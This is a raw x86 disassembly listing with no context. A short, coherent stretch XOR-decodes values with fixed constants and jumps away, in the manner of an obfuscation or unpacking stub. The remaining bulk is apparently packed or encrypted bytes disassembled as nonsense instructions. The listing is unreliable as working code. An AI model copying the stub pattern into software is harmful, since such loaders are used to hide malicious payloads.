  40b052:	xor    eax,ebx
  40b054:	add    eax,edi
  40b056:	jmp    0x40f898
  40b05b:	mov    eax,DWORD PTR [ebp-0x4]
  40b05e:	xor    eax,ebx
  40b060:	add    eax,0x3272db
  40b065:	jmp    0x40f898
  40b06a:	mov    ecx,DWORD PTR [ebp-0x38]
  40b06d:	add    ecx,DWORD PTR [ebp+0x8]
  40b070:	mov    DWORD PTR [ebp-0x10],ecx
  40b073:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b076:	test   ecx,ecx
  40b078:	je     0x40d4be
  40b07e:	mov    DWORD PTR [ebp-0x20],0x0
  40b085:	push   0x3
  40b087:	xor    edx,edx
  40b089:	pop    edx
  40b08a:	add    edx,0x8
  40b08d:	push   edx
  40b08e:	pop    ecx
  40b08f:	push   0x6
  40b091:	dec    ecx
  40b092:	pop    ebx
  40b093:	dec    ebx
  40b094:	xchg   ebx,ecx
  40b096:	sub    ebx,ecx
  40b098:	xchg   ebx,ecx
  40b09a:	dec    ecx
  40b09b:	mov    eax,DWORD PTR [ebp-0x1c]
  40b09e:	imul   eax,ecx
  40b0a1:	sub    esp,eax
  40b0a3:	mov    DWORD PTR [ebp-0x20],esp
  40b0a6:	mov    eax,DWORD PTR [ebp-0x4]
  40b0a9:	mov    ecx,0x7510893
  40b0ae:	xor    eax,ecx
  40b0b0:	mov    edx,0x3272db
  40b0b5:	add    eax,edx
  40b0b7:	mov    DWORD PTR [ebp+0x8],eax
  40b0ba:	mov    eax,DWORD PTR [ebp-0x14]
  40b0bd:	xor    eax,ecx
  40b0bf:	add    eax,edx
  40b0c1:	mov    edx,DWORD PTR [ebp+0x14]
  40b0c4:	jmp    0x40d429
  40b0c9:	fidiv  DWORD PTR [ecx+0x21]
  40b0cc:	jb     0x40b137
  40b0ce:	xor    ch,BYTE PTR [ecx-0x57]
  40b0d1:	ss pop es
  40b0d3:	add    eax,0xaeb969b
  40b0d8:	retf   0xf5e8
  40b0db:	bound  esp,QWORD PTR [edx+0x3a]
  40b0de:	pop    edi
  40b0df:	bound  esp,QWORD PTR [edx-0x3a]
  40b0e2:	or     bh,BYTE PTR [eiz*1+0x103995b0]
  40b0e9:	push   es
  40b0ea:	push   esp
  40b0eb:	jno    0x40b09a
  40b0ed:	nop
  40b0ee:	dec    eax
  40b0ef:	popa   
  40b0f0:	scas   eax,DWORD PTR es:[edi]
  40b0f1:	(bad)  [eax]
  40b0f3:	stos   DWORD PTR es:[edi],eax
  40b0f4:	daa    
  40b0f5:	xchg   ebx,eax
  40b0f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f7:	jl     0x40b09a
  40b0f9:	icebp  
  40b0fa:	pop    esi
  40b0fb:	sar    BYTE PTR [edx+ebx*4+0x4],cl
  40b0ff:	jmp    0x40b124
  40b101:	add    al,0xcd
  40b103:	iret   
  40b104:	sbb    dh,BYTE PTR [ebp-0xa]
  40b107:	ror    DWORD PTR [ebx+0x27],cl
  40b10a:	mov    esp,0x9d4376d4
  40b10f:	imul   edx,DWORD PTR [edi-0x46],0x938014d1
  40b116:	sbb    eax,0x753e2925
  40b11b:	add    BYTE PTR [ebp-0x54588168],cl
  40b121:	ss test al,0x6a
  40b124:	mov    BYTE PTR [edi+eax*1-0x2f2babd3],bl
  40b12b:	(bad)  
  40b12d:	xlat   BYTE PTR ds:[ebx]
  40b12e:	add    BYTE PTR [edx],cl
  40b130:	xchg   edi,eax
  40b131:	jns    0x40b103
  40b133:	sub    esi,DWORD PTR [esi+0x18e89b02]
  40b139:	pop    edx
  40b13a:	xlat   BYTE PTR ds:[ebx]
  40b13b:	mov    ecx,DWORD PTR [eax]
  40b13d:	jb     0x40b0d8
  40b13f:	imul   bh
  40b141:	cmp    eax,0x6e6db137
  40b146:	xor    DWORD PTR [edx],esp
  40b148:	aaa    
  40b149:	gs pusha 
  40b14b:	inc    edx
  40b14c:	outs   dx,DWORD PTR ds:[esi]
  40b14d:	cmp    eax,0x15fad4df
  40b152:	imul   esi,DWORD PTR [edx],0x4f0a3a4
  40b158:	mov    ah,BYTE PTR [edx-0x735e1446]
  40b15e:	pop    esp
  40b15f:	sbb    eax,0x431ab22f
  40b164:	jmp    0x40b1ce
  40b166:	dec    ecx
  40b167:	call   0x40afbd3d
  40b16c:	adc    BYTE PTR [eax-0x17dd8dc7],al
  40b172:	leave  
  40b173:	fld    DWORD PTR ds:0xf4a55684
  40b179:	or     edi,ecx
  40b17b:	popa   
  40b17c:	and    al,0x14
  40b17e:	mov    ds:0x9257aebc,eax
  40b183:	mov    ds:0x963ab7ad,al
  40b188:	pop    edx
  40b189:	push   0x96def783
  40b18e:	aam    0xf4
  40b190:	test   DWORD PTR gs:[esp+ebx*1+0x12],0x7f72133f
  40b199:	add    eax,DWORD PTR [edx-0x3d]
  40b19c:	stos   BYTE PTR es:[edi],al
  40b19d:	mov    bh,bl
  40b19f:	push   0xffffffd3
  40b1a1:	(bad)  
  40b1a2:	gs mov edi,0xc5a1720
  40b1a8:	sub    al,0xcd
  40b1aa:	test   BYTE PTR [ebx],bl
  40b1ac:	jmp    0x6d8:0x8086461f
  40b1b3:	and    eax,0x14106f86
  40b1b8:	dec    eax
  40b1b9:	mov    ecx,0xe8c131a4
  40b1be:	dec    ecx
  40b1bf:	fldz   
  40b1c1:	jae    0x40b149
  40b1c3:	(bad)  
  40b1c4:	bound  ecx,QWORD PTR [ecx]
  40b1c6:	(bad)  
  40b1c7:	fbld   TBYTE PTR [edx]
  40b1c9:	xchg   ebp,eax
  40b1ca:	pop    esi
  40b1cb:	sbb    BYTE PTR [ebp+0x19659f23],ah
  40b1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d2:	addr16 mov edx,0x814a4aea
  40b1d8:	scas   eax,DWORD PTR es:[edi]
  40b1d9:	pushf  
  40b1da:	pop    ecx
  40b1db:	xor    al,dl
  40b1dd:	daa    
  40b1de:	ds in  eax,0xc
  40b1e1:	fwait
  40b1e2:	xchg   ebp,eax
  40b1e3:	inc    esi
  40b1e4:	int3   
  40b1e5:	ja     0x40b1e4
  40b1e7:	mov    dl,BYTE PTR ds:0x408e5214
  40b1ed:	aaa    
  40b1ee:	aad    0x9c
  40b1f0:	imul   eax,ebx,0xe955b55d
  40b1f6:	cdq    
  40b1f7:	xor    eax,0x11ee709c
  40b1fc:	mov    cl,0xf0
  40b1fe:	retf   0x3b9d
  40b201:	inc    edx
  40b202:	loopne 0x40b228
  40b204:	sub    DWORD PTR [eax+0x415a5f32],0xcb5f0d9
  40b20e:	push   ecx
  40b20f:	cmc    
  40b210:	jne    0x40b201
  40b212:	ret    0x3e54
  40b215:	pushf  
  40b216:	js     0x40b1b1
  40b218:	outs   dx,DWORD PTR ds:[esi]
  40b219:	stos   BYTE PTR es:[edi],al
  40b21a:	pop    es
  40b21b:	inc    edx
  40b21c:	sbb    eax,0x7c49a15d
  40b221:	jecxz  0x40b225
  40b223:	cmp    BYTE PTR [ebx+0x1b6ed19f],bh
  40b229:	lods   al,BYTE PTR ds:[esi]
  40b22a:	or     bl,cl
  40b22c:	retf   0x9fb4
  40b22f:	ror    dl,cl
  40b231:	(bad)  
  40b233:	sub    edx,DWORD PTR [eax+edx*4-0x73]
  40b237:	js     0x40b28b
  40b239:	pop    es
  40b23a:	lods   al,BYTE PTR ds:[esi]
  40b23b:	(bad)  
  40b23c:	pop    edi
  40b23d:	mov    edi,0xec4c4a7c
  40b242:	pop    edx
  40b243:	dec    ebp
  40b244:	rol    BYTE PTR [ecx+0xc],cl
  40b247:	leave  
  40b248:	loope  0x40b293
  40b24a:	pop    edi
  40b24b:	jne    0x40b2ac
  40b24d:	cmp    ebx,edi
  40b24f:	cmp    al,0x99
  40b251:	in     al,dx
  40b252:	gs push esp
  40b254:	add    ch,BYTE PTR [esi+0x46]
  40b257:	push   cs
  40b258:	out    dx,al
  40b259:	jae    0x40b277
  40b25b:	dec    esp
  40b25c:	xor    eax,0xb505fcfe
  40b261:	push   edi
  40b262:	int3   
  40b263:	push   ebx
  40b264:	or     eax,0x75e2e04d
  40b269:	popf   
  40b26a:	mov    ds:0xd524d066,eax
  40b26f:	dec    esi
  40b270:	mov    ah,0x29
  40b272:	outs   dx,DWORD PTR ds:[esi]
  40b273:	pop    esi
  40b274:	dec    esp
  40b275:	cli    
  40b276:	mov    al,ds:0xbd62c595
  40b27b:	(bad)
  40b27e:	inc    esi
  40b27f:	xchg   esp,eax
  40b280:	jg     0x40b22f
  40b282:	sub    DWORD PTR [ecx+0xd],edx
  40b285:	cmp    cl,dh
  40b287:	daa    
  40b288:	aaa    
  40b289:	mov    ah,dl
  40b28b:	ds mov bh,0x34
  40b28e:	mov    eax,ds:0x3c1240d3
  40b293:	sar    DWORD PTR [edx-0x4d],1
  40b296:	ss scas eax,DWORD PTR es:[edi]
  40b298:	dec    esi
  40b299:	adc    eax,0xd0d8afa6
  40b29e:	fisub  WORD PTR [esi]
  40b2a0:	lods   al,BYTE PTR ds:[esi]
  40b2a1:	sti    
  40b2a2:	jg     0x40b277
  40b2a4:	sub    eax,0x16416457
  40b2a9:	fnstsw WORD PTR [eax+0x79e99a1a]
  40b2af:	push   ebp
  40b2b0:	cmp    DWORD PTR [ebp-0x36c77119],edi
  40b2b6:	mov    DWORD PTR [edx],edx
  40b2b8:	nop
  40b2b9:	fcomip st,st(4)
  40b2bb:	xchg   ecx,eax
  40b2bc:	cmp    BYTE PTR [ecx-0x3b],0x9f
  40b2c0:	cmc    
  40b2c1:	ja     0x40b27c
  40b2c3:	scas   eax,DWORD PTR es:[edi]
  40b2c4:	push   ss
  40b2c5:	sti    
  40b2c6:	nop
  40b2c7:	cdq    
  40b2c8:	sbb    BYTE PTR [esi+edx*4-0x5f],dh
  40b2cc:	xlat   BYTE PTR ds:[ebx]
  40b2cd:	sub    ebp,DWORD PTR [ebx]
  40b2cf:	fs dec edi
  40b2d1:	test   DWORD PTR [edi+ebx*8+0x3a],edx
  40b2d5:	ins    DWORD PTR es:[edi],dx
  40b2d6:	sub    DWORD PTR [esi+esi*4+0x5da86c4c],ebp
  40b2dd:	dec    ebx
  40b2de:	cdq    
  40b2df:	or     BYTE PTR ds:0xcb2a727f,0x5b
  40b2e6:	inc    ecx
  40b2e7:	aas    
  40b2e8:	(bad)  
  40b2eb:	test   eax,0x22accbf1
  40b2f0:	jnp    0x40b343
  40b2f2:	ficomp WORD PTR [edi-0x34ed598a]
  40b2f8:	push   0x9693e3fd
  40b2fd:	add    al,0xa7
  40b2ff:	mov    eax,ds:0x8d29bdb
  40b304:	push   0xffffffe0
  40b306:	cmp    edi,DWORD PTR [eax+0x57fbdecf]
  40b30c:	jns    0x40b2a5
  40b30e:	adc    BYTE PTR ds:0xb0619c16,ch
  40b314:	iret   
  40b315:	mov    ah,0x87
  40b317:	ret    0x479a
  40b31a:	popf   
  40b31b:	call   0xaf951e57
  40b320:	adc    DWORD PTR [bx+di-0x3b81],0xfffffff3
  40b326:	idiv   DWORD PTR gs:[edi+0x71]
  40b32a:	std    
  40b32b:	jmp    0x90d7:0xeb77cbfb
  40b332:	push   ebx
  40b333:	test   eax,0x135f5893
  40b338:	mov    al,ds:0xb73087f8
  40b33d:	fadd   DWORD PTR [edx]
  40b33f:	(bad)  
  40b340:	fild   QWORD PTR [ebp-0x2fe00b76]
  40b346:	cmp    DWORD PTR [eax+0x29acc11a],esp
  40b34c:	jno    0x40b2de
  40b34e:	out    0x4,al
  40b350:	and    ebx,eax
  40b352:	cmp    eax,0x2269ad56
  40b357:	xlat   BYTE PTR ds:[ebx]
  40b358:	mov    fs,WORD PTR [ebx+0x78]
  40b35b:	aad    0xc1
  40b35d:	cmp    cl,BYTE PTR [edx]
  40b35f:	pop    esp
  40b360:	jmp    0x40b393
  40b362:	shl    DWORD PTR [ecx-0x2997ed61],0xa7
  40b369:	dec    eax
  40b36a:	loope  0x40b317
  40b36c:	xor    ah,bl
  40b36e:	add    DWORD PTR [ecx+esi*8+0x52],edx
  40b372:	mov    ch,0xc2
  40b374:	loop   0x40b343
  40b376:	cld    
  40b377:	loop   0x40b32a
  40b379:	es pop ss
  40b37b:	pusha  
  40b37c:	rol    BYTE PTR [eax+0x408be034],0xbc
  40b383:	enter  0xb1b1,0x5c
  40b387:	mov    esi,0xc75efbc2
  40b38c:	xor    al,bl
  40b38e:	or     al,0xcb
  40b390:	push   0x519fc4e9
  40b395:	and    eax,0x73789d76
  40b39a:	fst    st(7)
  40b39c:	lds    ebx,FWORD PTR [esi]
  40b39e:	adc    eax,0x2cfea52d
  40b3a3:	repz push ds
  40b3a5:	ret    0x269e
  40b3a8:	int3   
  40b3a9:	mov    dh,0xa2
  40b3ab:	mov    esi,0x83082abb
  40b3b0:	inc    edi
  40b3b1:	xor    BYTE PTR gs:[eax+0x6e543774],dl
  40b3b8:	sub    ebx,ecx
  40b3ba:	ficomp DWORD PTR es:[ebx+0x23d7ff63]
  40b3c1:	rcr    DWORD PTR [edi-0x187f300e],0x54
  40b3c8:	addr16 dec ebp
  40b3ca:	ror    edi,0x28
  40b3cd:	fmul   DWORD PTR [ecx+ebx*8-0x9]
  40b3d1:	xchg   ebx,eax
  40b3d2:	dec    ecx
  40b3d3:	loop   0x40b3f8
  40b3d5:	cld    
  40b3d6:	jbe    0x40b42e
  40b3d8:	hlt    
  40b3d9:	(bad)  
  40b3da:	out    0x80,eax
  40b3dc:	std    
  40b3dd:	(bad)  
  40b3de:	(bad)  
  40b3df:	pop    ds
  40b3e0:	adc    al,BYTE PTR [eax+0x6c8a0d16]
  40b3e6:	mov    edi,0x9751c6a0
  40b3eb:	imul   BYTE PTR [ebp-0x3c]
  40b3ee:	fld    DWORD PTR [ebp+0x39]
  40b3f1:	ret    
  40b3f2:	pop    esi
  40b3f3:	in     al,dx
  40b3f4:	pop    ebp
  40b3f5:	or     al,0xa2
  40b3f7:	mov    ebx,0x52d81ff9
  40b3fc:	loopne 0x40b3f4
  40b3fe:	jae    0x40b398
  40b400:	shl    ecx,0x7f
  40b403:	pop    edx
  40b404:	lea    edx,[si+0x4a72]
  40b409:	cmp    ah,BYTE PTR [esp+eax*8]
  40b40c:	bound  esp,QWORD PTR [esi+0x13]
  40b40f:	test   eax,0x2505d119
  40b414:	fsub   QWORD PTR [ebx+ecx*1]
  40b417:	push   es
  40b418:	fld    DWORD PTR [esi]
  40b41a:	sar    DWORD PTR [eax-0xa],1
  40b41d:	and    dh,ah
  40b41f:	inc    esp
  40b420:	aam    0xdb
  40b422:	aam    0x35
  40b424:	sti    
  40b425:	pop    edx
  40b426:	test   eax,esi
  40b428:	mov    BYTE PTR [edi-0x1d1bdd53],cl
  40b42e:	shr    BYTE PTR [ebp+0x2e],0x2d
  40b432:	mov    BYTE PTR [esi-0x78],bl
  40b435:	jno    0x40b3ea
  40b437:	in     al,dx
  40b438:	cmp    BYTE PTR [edi-0x60],dh
  40b43b:	not    BYTE PTR [edx]
  40b43d:	clc    
  40b43e:	xor    BYTE PTR cs:[esi-0x4564c8bd],al
  40b445:	jg     0x40b428
  40b447:	loop   0x40b4c7
  40b449:	adc    eax,0x4a5f64b3
  40b44e:	in     al,dx
  40b44f:	mov    ebp,0x72aac280
  40b454:	push   ecx
  40b455:	inc    esp
  40b456:	aas    
  40b457:	push   esp
  40b458:	sbb    eax,0xf2ce84ee
  40b45d:	lock mov al,ds:0x8d3698bf
  40b463:	cwde   
  40b464:	scas   eax,DWORD PTR es:[edi]
  40b465:	jmp    FWORD PTR [ebp-0xc]
  40b468:	mov    eax,DWORD PTR [eax+0x3b]
  40b46b:	dec    eax
  40b46c:	xchg   edi,eax
  40b46d:	xchg   ebx,eax
  40b46e:	push   ebp
  40b46f:	mov    ecx,DWORD PTR [eax]
  40b471:	inc    esp
  40b472:	mov    cs:0xdf3653e2,al
  40b478:	push   edx
  40b479:	push   0x7b28c5d2
  40b47e:	in     eax,0x9
  40b480:	mov    esp,0x2841b433
  40b485:	popf   
  40b486:	mov    dh,0xba
  40b488:	mov    eax,0x23b34a57
  40b48d:	pop    ds
  40b48e:	ss xchg edx,eax
  40b490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b491:	jle    0x40b463
  40b493:	cmp    BYTE PTR [eax+0x62],bh
  40b496:	pop    ebp
  40b497:	or     DWORD PTR [edi+ebp*8-0x62c6bb49],0x21
  40b49f:	and    DWORD PTR [edx],esi
  40b4a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4a2:	add    dh,ah
  40b4a4:	dec    ecx
  40b4a5:	loopne 0x40b427
  40b4a7:	xor    BYTE PTR [eax-0x686287c2],0x72
  40b4ae:	retf   
  40b4af:	out    0x1f,eax
  40b4b1:	aam    0x25
  40b4b3:	mov    cl,0xe9
  40b4b5:	out    dx,al
  40b4b6:	ret    0xd868
  40b4b9:	xor    BYTE PTR [edi+0x7],dh
  40b4bc:	mov    esi,0x4e3a0218
  40b4c1:	adc    edx,DWORD PTR ds:0x8cb5
  40b4c6:	mov    dh,0x93
  40b4c8:	loopne 0x40b44a
  40b4ca:	mov    al,ds:0x7e1d8fcb
  40b4cf:	push   es
  40b4d0:	mov    ebx,0x5528ead9
  40b4d5:	cmp    eax,0x726bc075
  40b4da:	add    BYTE PTR [eax],bh
  40b4dc:	push   esp
  40b4dd:	adc    DWORD PTR ds:0x3f72d053,ecx
  40b4e3:	pop    ecx
  40b4e4:	mov    dl,0xb
  40b4e6:	jo     0x40b49a
  40b4e8:	fstp   TBYTE PTR [edi-0x38d967]
  40b4ee:	loopne 0x40b52c
  40b4f0:	enter  0x3f44,0x15
  40b4f4:	stc    
  40b4f5:	fnstsw WORD PTR [ecx]
  40b4f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f8:	dec    eax
  40b4f9:	xlat   BYTE PTR ds:[ebx]
  40b4fa:	aam    0x9f
  40b4fc:	das    
  40b4fd:	xchg   edi,eax
  40b4fe:	fsubrp st(5),st
  40b500:	lahf   
  40b501:	push   ebp
  40b502:	sub    eax,0x79e0447d
  40b507:	pop    DWORD PTR [eax+esi*4]
  40b50a:	mov    ecx,0xc430f62b
  40b50f:	mov    ss,WORD PTR [ebx-0x2c]
  40b512:	mov    edi,DWORD PTR [ebp+0x39]
  40b515:	pop    edi
  40b516:	and    cl,ch
  40b518:	lock sub ch,dl
  40b51b:	(bad)  
  40b51c:	test   eax,0xa998c46
  40b521:	add    esp,esi
  40b523:	add    BYTE PTR [esi+0x44ef3811],0xf7
  40b52a:	pusha  
  40b52b:	mov    ?,WORD PTR [ecx]
  40b52d:	adc    al,0x10
  40b52f:	xchg   ebp,eax
  40b530:	jbe    0x40b509
  40b532:	scas   eax,DWORD PTR es:[edi]
  40b533:	retf   
  40b534:	sub    al,0xff
  40b536:	xor    dh,bh
  40b538:	out    dx,eax
  40b539:	and    al,BYTE PTR [eax+0x40b2576a]
  40b53f:	ss retf 0x76c4
  40b543:	jl     0x40b52e
  40b545:	popf   
  40b546:	jg     0x40b51f
  40b548:	in     eax,0x90
  40b54a:	jg     0x40b4ea
  40b54c:	popf   
  40b54d:	cmp    ch,ch
  40b54f:	mov    bh,0x1c
  40b551:	stos   BYTE PTR es:[edi],al
  40b552:	enter  0x2537,0x9d
  40b556:	or     al,0x88
  40b558:	mov    cl,0xaf
  40b55a:	inc    edx
  40b55b:	sbb    edi,ebp
  40b55d:	hlt    
  40b55e:	enter  0xd70,0x45
  40b562:	int3   
  40b563:	arpl   WORD PTR [edx],sp
  40b565:	in     eax,0x9f
  40b567:	pop    esi
  40b568:	bound  ebp,QWORD PTR [edi-0x4614e146]
  40b56e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b56f:	pop    esp
  40b570:	jb     0x40b5a8
  40b572:	loope  0x40b51a
  40b574:	pop    eax
  40b575:	outs   dx,BYTE PTR ds:[esi]
  40b576:	js     0x40b59a
  40b578:	shl    DWORD PTR [ecx],0xee
  40b57b:	retf   
  40b57c:	icebp  
  40b57d:	stos   BYTE PTR es:[edi],al
  40b57e:	popa   
  40b57f:	loopne 0x40b5c8
  40b581:	or     ecx,DWORD PTR [esi+eiz*2-0x2696a3da]
  40b588:	call   0x1c8cae69
  40b58d:	lods   eax,DWORD PTR ds:[esi]
  40b58e:	mov    BYTE PTR [ebx+0x9],ah
  40b591:	jmp    0xb7c4a789
  40b596:	inc    esi
  40b597:	cwde   
  40b598:	xchg   ebx,eax
  40b599:	inc    esi
  40b59a:	imul   ecx,DWORD PTR [edx+esi*1],0x48
  40b59e:	addr16 out 0xfa,al
  40b5a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a2:	scas   eax,DWORD PTR es:[edi]
  40b5a3:	(bad)  
  40b5a4:	rcr    DWORD PTR [ebx],cl
  40b5a6:	loop   0x40b5c9
  40b5a8:	inc    edx
  40b5a9:	mov    edi,0x71b2df44
  40b5ae:	ret    
  40b5af:	xchg   edi,eax
  40b5b0:	stos   DWORD PTR es:[edi],eax
  40b5b1:	(bad)  
  40b5b3:	pop    eax
  40b5b4:	push   edi
  40b5b5:	in     eax,0x5a
  40b5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5b8:	inc    ebx
  40b5b9:	jecxz  0x40b555
  40b5bb:	or     BYTE PTR [ebx-0x2f],ah
  40b5be:	jb     0x8a7a2900
  40b5c4:	push   ecx
  40b5c5:	outs   dx,BYTE PTR ds:[esi]
  40b5c6:	mov    eax,0x30e4c813
  40b5cb:	inc    esi
  40b5cc:	jne    0x40b5ea
  40b5ce:	ret    0xe872
  40b5d1:	in     al,dx
  40b5d2:	popf   
  40b5d3:	jne    0x40b59c
  40b5d5:	sub    eax,0x2b25feec
  40b5da:	pcmpgtb mm2,mm5
  40b5dd:	aaa    
  40b5de:	imul   ebx,DWORD PTR [ecx],0xffffffe8
  40b5e1:	mov    ds:0x6bf91115,eax
  40b5e6:	jg     0x40b59b
  40b5e8:	int    0x9a
  40b5ea:	std    
  40b5eb:	mov    WORD PTR [eax+0x66],gs
  40b5ee:	xchg   edx,eax
  40b5ef:	xchg   ebx,eax
  40b5f0:	dec    edx
  40b5f1:	loopne 0x40b5b5
  40b5f3:	cmp    eax,0x131b6219
  40b5f8:	and    al,0x9c
  40b5fa:	sbb    al,0x50
  40b5fc:	loop   0x40b597
  40b5fe:	xchg   esp,eax
  40b5ff:	sbb    eax,0x45c40eef
  40b604:	fidiv  DWORD PTR [edi]
  40b606:	push   0xffffff82
  40b608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b609:	inc    edi
  40b60a:	mov    ah,0x45
  40b60c:	scas   eax,DWORD PTR es:[edi]
  40b60d:	(bad)  
  40b60e:	mov    ds:0x107fea29,eax
  40b613:	fs mov ebp,0x1187cfef
  40b619:	(bad)  
  40b61b:	mov    ebx,0xec08cb3
  40b620:	fstp   QWORD PTR [esi+0x77]
  40b623:	mov    eax,ds:0x34858793
  40b628:	gs jl  0x40b607
  40b62b:	fisubr DWORD PTR fs:[ebx-0x42]
  40b62f:	add    BYTE PTR [esi-0x45f30bf5],bh
  40b635:	aad    0x88
  40b637:	dec    ebx
  40b638:	scas   eax,DWORD PTR es:[edi]
  40b639:	push   0x1fc5303a
  40b63e:	ss pusha 
  40b640:	add    bh,BYTE PTR [esp+esi*2]
  40b643:	and    eax,edx
  40b645:	mov    WORD PTR [edx+0x6e],fs
  40b648:	add    eax,0xea9197c8
  40b64d:	ret    0xf70e
  40b650:	or     DWORD PTR [eax+0x73cfee33],ecx
  40b656:	stos   DWORD PTR es:[edi],eax
  40b657:	test   al,0x1a
  40b659:	dec    ecx
  40b65a:	dec    edi
  40b65b:	jbe    0x40b687
  40b65d:	jge    0x40b68c
  40b65f:	push   edi
  40b660:	stos   DWORD PTR es:[edi],eax
  40b661:	sub    DWORD PTR [ebx-0x4c],edx
  40b664:	js     0x40b6b8
  40b666:	loope  0x40b640
  40b668:	inc    DWORD PTR [ecx+0x2ec08e07]
  40b66e:	mov    ebx,0xbc909550
  40b673:	loop   0x40b63b
  40b675:	dec    edi
  40b676:	mov    edi,0x475382c6
  40b67b:	or     DWORD PTR [esi+0x2d2da7a0],0x40
  40b682:	in     al,dx
  40b683:	inc    edi
  40b684:	sbb    BYTE PTR [ebx-0x63155dc9],ch
  40b68a:	push   ebp
  40b68b:	cmp    al,0xfb
  40b68d:	mov    ah,0x33
  40b68f:	ja     0x40b674
  40b691:	nop
  40b692:	xchg   esp,eax
  40b693:	or     DWORD PTR [ecx+0x3837bc80],esi
  40b699:	fdiv   DWORD PTR ds:0x37c06c4e
  40b69f:	cmp    BYTE PTR ds:0x91f57953,0x81
  40b6a6:	cld    
  40b6a7:	sub    ebp,DWORD PTR [edx-0x7905d7d8]
  40b6ad:	sti    
  40b6ae:	cs nop
  40b6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6b1:	mov    ebx,0xdce6470e
  40b6b6:	enter  0x3f4c,0xd2
  40b6ba:	outs   dx,DWORD PTR ds:[esi]
  40b6bb:	nop
  40b6bc:	xchg   ebp,eax
  40b6bd:	test   eax,0x90a88f5e
  40b6c2:	dec    edx
  40b6c3:	jecxz  0x40b6f7
  40b6c5:	sbb    eax,0x5c5b3fc7
  40b6ca:	fcmovnu st,st(2)
  40b6cc:	xor    BYTE PTR [ebx+0x6853b155],bl
  40b6d2:	imul   edi,DWORD PTR gs:[ecx],0xffffffa1
  40b6d6:	out    dx,al
  40b6d7:	call   0x3fbf:0x6dda563a
  40b6de:	pop    edx
  40b6df:	mov    ch,0xa6
  40b6e1:	call   0x34171e7e
  40b6e6:	mov    ch,0x7f
  40b6e8:	jnp    0x40b66b
  40b6ea:	int3   
  40b6eb:	mov    al,0xfd
  40b6ed:	loop   0x40b748
  40b6ef:	sub    BYTE PTR [edx+eax*2+0x5b],0x64
  40b6f4:	test   cl,0x4c
  40b6f7:	mov    cl,0x43
  40b6f9:	jo     0x40b72d
  40b6fb:	popa   
  40b6fc:	mov    BYTE PTR [edi],0xf7
  40b6ff:	cmp    eax,0x1754bade
  40b704:	rol    DWORD PTR [edx+0x38feed66],1
  40b70a:	scas   al,BYTE PTR es:[edi]
  40b70b:	pop    esp
  40b70c:	retf   0xa1a3
  40b70f:	inc    ebx
  40b710:	cdq    
  40b711:	xchg   edi,eax
  40b712:	mov    edx,0xafa6f46c
  40b717:	out    dx,al
  40b718:	inc    esp
  40b719:	xor    BYTE PTR [edi],ch
  40b71b:	lock not DWORD PTR [edx+0x5802856d]
  40b722:	lahf   
  40b723:	daa    
  40b724:	push   es
  40b725:	pop    eax
  40b726:	mov    ch,BYTE PTR [esi]
  40b728:	fisttp DWORD PTR [ecx-0x4a]
  40b72b:	push   ebp
  40b72c:	mov    ebx,0x398f9c54
  40b731:	jge    0x40b786
  40b733:	xor    ecx,DWORD PTR [eax+edi*8+0x1cdfbac1]
  40b73a:	jp     0x40b7a7
  40b73c:	hlt    
  40b73d:	jnp    0x40b6c1
  40b73f:	in     eax,dx
  40b740:	mov    ds:0xdd676f79,al
  40b745:	dec    edi
  40b746:	sbb    eax,0x14a8721f
  40b74b:	mov    ebp,0xb752b0a2
  40b750:	adc    eax,0xa24df924
  40b755:	mov    BYTE PTR [eax],bl
  40b757:	inc    eax
  40b758:	cmp    DWORD PTR [ebx],edx
  40b75a:	mov    edx,0xcb4753ce
  40b75f:	xchg   DWORD PTR [ebx+0x43],eax
  40b762:	and    ch,dh
  40b764:	mov    cs,WORD PTR [edi-0x2e]
  40b767:	push   0x40f820e9
  40b76c:	fisubr WORD PTR [edx]
  40b76e:	retf   
  40b76f:	pusha  
  40b770:	into   
  40b771:	mov    esi,DWORD PTR [edx-0x5303c2fb]
  40b777:	popf   
  40b778:	(bad)  
  40b779:	mov    ah,0xa5
  40b77b:	mov    ebx,0x94fbb9e4
  40b780:	sbb    edx,DWORD PTR [edi+eax*8+0x746a04fb]
  40b787:	test   eax,0xcb729a72
  40b78c:	fild   QWORD PTR [edi-0x7b]
  40b78f:	add    dh,BYTE PTR [eax-0x152f6e4d]
  40b795:	push   0x10438ffa
  40b79a:	aas    
  40b79b:	loopne 0x40b7a1
  40b79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b79e:	jmp    0xed6c:0x9e157efc
  40b7a5:	sbb    eax,0x8bc29305
  40b7aa:	cli    
  40b7ab:	adc    DWORD PTR [ecx+0x1f],edi
  40b7ae:	rol    DWORD PTR [edx+esi*2+0x2f],cl
  40b7b2:	test   dl,al
  40b7b4:	dec    ebx
  40b7b5:	cmp    eax,0x4cc2a295
  40b7ba:	fnstcw WORD PTR [esi-0x30]
  40b7bd:	mov    al,ds:0x2cb1b2fa
  40b7c2:	jbe    0x40b801
  40b7c4:	in     al,0xb4
  40b7c6:	inc    edx
  40b7c7:	jecxz  0x40b76d
  40b7c9:	sbb    bl,dl
  40b7cb:	push   0x39
  40b7cd:	mov    al,0x67
  40b7cf:	jmp    0x9bbb878b
  40b7d4:	test   eax,0xc48689af
  40b7d9:	inc    ecx
  40b7da:	and    BYTE PTR [ecx+0x60],0x5a
  40b7de:	jns    0x40b7ad
  40b7e0:	fld    DWORD PTR [esp+ecx*4-0x6d]
  40b7e4:	rcl    DWORD PTR [edx+0x35],0x80
  40b7e8:	(bad)  
  40b7e9:	xor    BYTE PTR [eax],bl
  40b7eb:	xor    BYTE PTR [ecx+edi*2-0x5016218f],0x0
  40b7f3:	bnd jp 0x40b782
  40b7f6:	shl    edx,cl
  40b7f8:	push   0x819f7fd0
  40b7fd:	inc    eax
  40b7fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ff:	out    dx,eax
